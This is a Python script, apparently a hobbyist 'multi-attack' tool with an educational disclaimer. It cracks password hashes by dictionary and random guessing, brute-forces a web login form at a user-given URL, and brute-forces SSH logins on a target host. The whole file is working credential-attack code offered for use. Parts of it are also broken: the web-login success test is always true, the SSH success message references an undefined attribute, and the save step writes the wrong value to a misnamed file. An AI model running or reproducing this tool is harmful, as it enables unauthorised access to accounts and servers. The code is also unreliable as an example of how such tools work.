#import all the necessary modules ...
import hashlib
import random
import string
import time
import requests
import random
from threading import Thread
import os, paramiko, sys, socket
import colorama
from colorama import Fore, Back, Style

start = time.time()
CharLength = 1
counter = 1

letters = string.ascii_letters
numbs = string.digits
punc = string.punctuation

let_numbs = letters + numbs
let_punc = letters + punc
numbs_punc = numbs + punc
all_characters = letters + numbs + punc

colorama.init(autoreset=True)#auto resets your settings after every output

print(f'''{Fore.BLUE}
      ==========================================WELCOME TO MULTI-ATTACK=============================================================
      Author:Ntloyiya Okuhle
      Language:Python3                      =====  ====      =======
      Email:blessing.ntloyiya@gmail.com     === === ===  --  == = ==
      Site:okuhlentloyiya.com               ===     ===      ==   ==
      
      *Note* This tools is made for educational purposes, if you are caught doing illegal actions with it I will not be responsible.
      ==============================================================================================================================
      \n\n''')
#select the type of attack you want to perform
type_of_attack = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of attack do you want to do?\n\n"
                           "1. Dictionary Attack\n"
                           "2. Brute Force Attack\n"
                           "3. Random Login Attack\n"
                           "4.SSH BruteForce Attack\n\n"
                           "Enter your choice: "))
disc_list = []

if type_of_attack == 1:#dictionary attack option
    
    hash = str(input("[+]Enter the password hash: "))
    try:
        
        print(Fore.YELLOW + "\nCracking......./")
        dictionary_file = open("Passwords.txt", errors="ignore")
        content = dictionary_file.readlines()
        for word in content:
            new_word = word.replace("\n", "")
            disc_list.append(new_word)
        for i in disc_list:
        
            #learn and match the hash entered with generated one
            if len(hash) == 32:
                disc_hash = hashlib.md5(i.encode("utf-8")).hexdigest()
            elif len(hash) == 40:
                disc_hash = hashlib.sha1(i.encode("utf-8")).hexdigest()
            elif len(hash) == 64:
                disc_hash = hashlib.sha256(i.encode("utf-8")).hexdigest()
            if disc_hash == hash:
                time.sleep(0.5)
                print("\n \n")
                print(Fore.YELLOW + "Trying password.....")
                end = time.time()
                timetaken = end - start
                print("\n \n")
                print("Found it in ", timetaken, " seconds")
                print(Fore.GREEN + "\n[*]Password found! ", i)
                break
            if disc_hash != hash and disc_list.index(i) == len(disc_list) - 1:
                print(Fore.RED + "[-]Password not found!")
                break
    except NameError:
        print(Fore.RED + "[!]Hash not defined!\n")
        

if type_of_attack == 2:#Bruteforce attacking option
    
    hash = str(input("[+]Enter the password hash: "))
    try:
        type_of_characters = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of characters do you want to try?\n\n"
                                    "1. All character\n"
                                    "2.Only letters\n"
                                    "3. Letters and numbers\n"
                                    "4.Letters and Punctuactions\n"
                                    "5. Numbers and punctuations\n"
                                    "6. Numbers only"
                                    "\n"
                                    "[+]Enter your choice here: "))
        if type_of_characters == 1:
            choice_of_char = all_characters
        elif type_of_characters == 2:
            choice_of_char = letters
        elif type_of_characters == 3:
            choice_of_char = let_numbs
        elif type_of_characters == 4:
            choice_of_char = let_punc
        elif type_of_characters == 5:
            choice_of_char = numbs_punc
        elif type_of_characters == 6:
            choice_of_char = numbs

        generated_hash = 0
        gen_str = 0

        numb_of_char = int(input(f"{Fore.LIGHTMAGENTA_EX}\nHow many characters do you want to try: "))
        print("\nCraking..../\n")

        while hash != generated_hash:
            time.sleep(0.5)
            first = random.choice(choice_of_char)
            second = random.choice(choice_of_char)
            third = random.choice(choice_of_char)
            fourth = random.choice(choice_of_char)
            fifth = random.choice(choice_of_char)
            sixth = random.choice(choice_of_char)
            seventh = random.choice(choice_of_char)
            Eighth = random.choice(choice_of_char)
            Ninethy = random.choice(choice_of_char)
            Tenth = random.choice(choice_of_char)

            if numb_of_char == 1:
                gen_str = first
            elif numb_of_char == 2:
                gen_str = first + second
            elif numb_of_char == 3:
                gen_str = first + second + third
            elif numb_of_char == 4:
                gen_str = first + second + third + fourth
            elif numb_of_char == 5:
                gen_str = first + second + third + fourth + fifth
            elif numb_of_char == 6:
                gen_str = first + second + third + fourth + fifth +sixth
            elif numb_of_char == 7:
                gen_str = first + second + third + fourth + fifth +sixth + seventh
            elif numb_of_char == 8:
                gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth

            elif numb_of_char == 9:
                gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth + Ninethy

            elif numb_of_char == 10:
                gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth + Tenth

            counter += 1

            # This prints three blank lines.
            print("\n \n")

            # These print information for the user on the progress of the crack.
            #print("Similar Password: "+ gen_str )
            #print(f"{Fore.YELLOW}We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
            #print(f"{Fore.YELLOW}It has been ", time.time() - start, " seconds!")
            #print(f"{Fore.YELLOW}We have tried ", counter, " possible passwords!")
            print(Fore.YELLOW + "Trying =======>", gen_str)


            if len(hash) == 32:
                generated_hash = hashlib.md5(gen_str.encode("utf-8")).hexdigest()
            elif len(hash) == 40:
                generated_hash = hashlib.sha1(gen_str.encode("utf-8")).hexdigest()
            elif len(hash) == 64:
                generated_hash = hashlib.sha256(gen_str.encode("utf-8")).hexdigest()

            if hash == generated_hash:
                    # This takes the time at which the program finished.
                end = time.time()

                    # This works out the time it took to find the password.
                timetaken = end - start
                #print the password found!

                print("\n \n")
                print(Fore.GREEN + f"[*]Password found! {gen_str}")
                    # This tells the user how long it took to find the password as well as how many attempts it took.
                print("\n \n")
                print("Found it in ", timetaken, " seconds and ", counter, " attempts")

                    # This tells the user how many attempst were made per second.
                print("That is ", counter / timetaken, " attempts per second!")
                save_pass = input("Do you want to save the password(N/Y)?: ")
                if save_pass == "Y":
                  with open('Passwords.tx', 'w') as f:
                        f.write(save_pass)
                        print(Fore.GREEN + "Password Successfully saved!")
                else:
                  pass


                break
    except NameError:
        print(Fore.RED + "\n[!]Make sure you enter the hash password!")
    except KeyboardInterrupt:
        print(f"{Fore.RED} \n[!]The hacking process was interupted , try again!")
if type_of_attack == 3:
    # define the webpage you want to crack

    # this page must be a login page with a username and password

    url = input(f"{Fore.LIGHTMAGENTA_EX}[+]Enter the target url: ")

    # let's get the username

    username = input(f"{Fore.LIGHTMAGENTA_EX}[+]What is the username you wish to attempt?: ")

    # next, let's get the password file

    #password_file = input("Please enter the name of the password file: ")

    # open the password file in read mode
    try:
        

        file = open("Passwords.txt", "r")

        # now let's get each password in the password_file

        for password in file.readlines():
            

        # let's strip it of any \n

            password = password.strip("\n")

        # collect the data needed from "inspect element"

            data = {'username':username, 'password':password, "Login":'submit'}

            send_data_url = requests.post(url, data=data)

            if "Invalid Password" or "login failed!" in str(send_data_url.content):

                print(Fore.YELLOW + "\n[*] Attempting password: %s" % password)

            else:

                print(Fore.GREEN + "[*] Password found: %s " % password)
    except:
        print(Fore.RED + "\n [!]Something went wrong!, this maybe due to internet connection or you entered an incorrect url.")
        
if type_of_attack == 4:
    global host,user, line, input_file
    
    line ="\n--------------------------------------------------\n"
    try:
        host = input("[*] Enter Target Host Address: ")
        user = input("[*]Enter SSH Username: ")
        input_file =input("[*] Enter SSH Password File: ")
        
        if os.path.exists(input_file) == False:
            print("\n[*] File Path Does Not Exist !!")
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n [*] User Interrupted the process")
        sys.exit(3)
        
    def ssh_connect(password, code = 0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(host,port=22, username=user,password=password)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2
            
        ssh.close()
        return code
    input_file = open(input_file)
    
    print('')
    
    for i in input_file.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(password)
            
            if response == 0:
                print("%s[*]User: %s [*] Pass Found: %s&s" % (line,username.passsword,line))
                sys.exit(0)
            elif response == 1:
                print("[*] User: %s [*] Pass %s ==>Login Incorrect !!! <==" & (username, password))
            elif response == 2:
                print("[*]Connection Could Not Be Established To Address: %s" %(host))
                sys.exit(2)
        except Exception as e:
            print('0')
            pass
    input_file.close()
